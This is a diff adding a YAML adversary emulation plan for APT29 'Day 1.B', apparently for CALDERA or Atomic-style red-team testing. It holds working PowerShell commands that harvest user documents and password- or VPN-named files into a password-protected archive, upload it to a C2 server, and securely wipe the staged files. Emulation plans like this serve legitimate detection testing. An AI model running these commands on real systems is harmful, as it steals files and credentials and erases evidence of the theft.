@@ -1,0 +1,132 @@
+# APT29-Day1.B.yaml - CALDERA and Atomic style TTPs
+
+- emulation_plan_details:
+    id: 7d264eae-7d49-4d89-96cd-df6b60914a6c
+    adversary_name: APT29 Day 1.B
+    adversary_description: APT29 is a threat group that has been attributed to the Russian government who have been in operation since at least 2008. This group reportedly compromised the Democratic National Committee starting in the summer of 2015. This adversary models scenario Day 1.B of the APT29.
+    attack_version: 8.1
+    format_version: 1.0
+
+- id: 08e57385-dbce-4850-8bb7-589ef79465ab
+  name: Automated document collection (T1119)
+  description: Execute PowerShell collection command to collect and compress files of specific extensions.
+  tactic: execution
+  technique:
+    attack_id: T1059.001
+    name: "Command and Scripting Interpreter: PowerShell"
+  cti_source: "https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html"
+  procedure_group: procedure_execution
+  procedure_step: "9.B.1"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          move-item Rar.exe -Destination C:\Windows\Temp -Force;
+          $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force;
+          cd C:\Windows\Temp;
+          .\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip";
+        payloads:
+        - rar.exe
+
+  executors:
+  - name: powershell
+    command: |
+      move-item Rar.exe -Destination C:\Windows\Temp -Force;
+      $env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force;
+      cd C:\Windows\Temp;
+      .\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip";
+
+- id: 2d18c8ec-4593-49dc-9bf4-11d0673d6ae6
+  name: Data from staged file (T1074) and Exfiltration over C2 Channel (T1041)
+  description: Copy a target file from a remote file share through the existing C2 channel
+  tactic: exfiltration
+  technique:
+    attack_id: T1041
+    name: "Exfiltration Over C2 Channel"
+  cti_source: "https://blog-assets.f-secure.com/wp-content/uploads/2020/03/18122307/F-Secure_Dukes_Whitepaper.pdf"
+  procedure_group: procedure_exfiltration
+  procedure_step: "9.B.8"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          Import-Module .\upload.ps1 -Verbose -Force;
+          Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/file/upload";
+        cleanup: |
+          remove-item upload.ps1 -Force
+        payloads:
+        - upload.ps1
+
+  input_arguments:
+    profile_user:
+      description: Name of profile user
+      type: string
+      default: Administrator
+
+    server:
+      description: IP or Hostname of server
+      type: string
+      default: 192.0.2.10
+
+  executors:
+  - name: powershell
+    command: |
+      Import-Module .\upload.ps1 -Verbose -Force;
+      Invoke-MultipartFormDataUpload -InFile "C:\Users\#{profile_user}\Desktop\working.zip" -Uri "#{server}/file/upload";
+    cleanup_command: |
+      remove-item upload.ps1 -Force
+
+- id: 208b021b-c79a-4176-8ad1-3af99ed50c6f
+  name: Artifact Cleanup - Delete Staged Files
+  description: Cleanup files related to Operation
+  tactic: defensive-evasion
+  technique:
+    attack_id: T1070.004
+    name: "Indicator Removal on Host: File Deletion"
+  cti_source: "https://community.broadcom.com/symantecenterprise/communities/community-home/librarydocuments/viewdocument?DocumentKey=6ab66701-25d7-4685-ae9d-93d63708a11c&CommunityKey=1ecf5f55-9545-44d6-b0f4-4e4a7f5f5e68&tab=librarydocuments"
+  procedure_group: procedure_def_evasion
+  procedure_step: "9.C"
+  platforms:
+    windows:
+      psh,pwsh:
+        command: |
+          if (!$(test-path -path "C:\Program Files\SysInternalsSuite")) {
+            mkdir "C:\Program Files\SysInternalsSuite";
+          }
+          set-location "C:\Program Files\SysInternalsSuite";
+
+          if (!$(test-path -path "sdelete64.exe")) {
+            iwr -uri "https://download.sysinternals.com/files/SDelete.zip" -outfile sdelete64.zip;
+            Expand-Archive sdelete64.zip -force;
+          }
+          copy sdelete64.exe C:\Windows\Temp\;
+          cd C:\Windows\Temp\ ;
+          .\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
+          .\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
+          .\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
+          remove-item C:\Windows\Temp\sdelete64.exe -force;
+
+  input_arguments:
+    profile_user:
+      description: Name of profile user
+      type: string
+      default: Administrator
+
+  executors:
+  - name: powershell
+    command: |
+      if (!$(test-path -path "C:\Program Files\SysInternalsSuite")) {
+        mkdir "C:\Program Files\SysInternalsSuite";
+      }
+      set-location "C:\Program Files\SysInternalsSuite";
+
+      if (!$(test-path -path "sdelete64.exe")) {
+        iwr -uri "https://download.sysinternals.com/files/SDelete.zip" -outfile sdelete64.zip;
+        Expand-Archive sdelete64.zip -force;
+      }
+      copy sdelete64.exe C:\Windows\Temp\;
+      cd C:\Windows\Temp\ ;
+      .\sdelete64.exe /accepteula C:\Windows\Temp\Rar.exe;
+      .\sdelete64.exe /accepteula C:\Users\#{profile_user}\AppData\Roaming\working.zip;
+      .\sdelete64.exe /accepteula C:\Users\#{profile_user}\Desktop\working.zip;
+      remove-item C:\Windows\Temp\sdelete64.exe -force;
